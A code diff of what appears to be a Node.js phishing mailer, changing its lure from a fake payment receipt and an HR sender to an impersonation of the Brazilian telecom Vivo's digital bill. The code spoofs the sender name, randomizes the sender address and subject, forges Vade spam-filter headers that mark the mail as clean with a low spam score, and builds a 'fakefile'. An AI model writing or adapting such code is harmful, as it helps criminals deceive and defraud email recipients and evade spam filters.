@@ -217,7 +217,7 @@ async function sendEmail(email) {
   html = novohtml;
   //RANDON HTML
 
-  let subject = `El comprobante de pago  Nr:${randomstring.generate(
+  let subject = `Sua Conta Digital Vivo chegou por e-mail -  Nr:${randomstring.generate(
     9
   )}-`;
   //let subject = `Rescisão de contrato de trabalho -${randomstring.generate(8)}-`;
@@ -240,14 +240,14 @@ async function sendEmail(email) {
     const buff = Buffer.from(fakefile, "utf-8");
     // decode buffer as Base64
     const base64 = buff.toString("base64");
-    let nome = "RH";
+    let nome = "VIVO";
     let info = await transporter.sendMail({
       from:
         "=?UTF-8?B?" +
         Buffer.alloc(nome.length, nome).toString("base64") +
         "?=" +
         " <" +
-        "adm" +
+        "vivo" +
         randomstring.generate(between(3, 5)) +
         "@" +
         hostName +
@@ -272,7 +272,7 @@ async function sendEmail(email) {
         "X-VADE-SPAMSTATE": "clean",
         "X-VADE-SPAMSCORE": "" + between(0, 49),
         "X-VADE-SPAMCAUSE": await randomstring.generate(980),
-        "List-Unsubscribe": `<mailto:adm@${hostName}?subject=unsubscribe>`,
+        "List-Unsubscribe": `<mailto:vivo@${hostName}?subject=unsubscribe>`,
       },
       /* attachments: [
         {
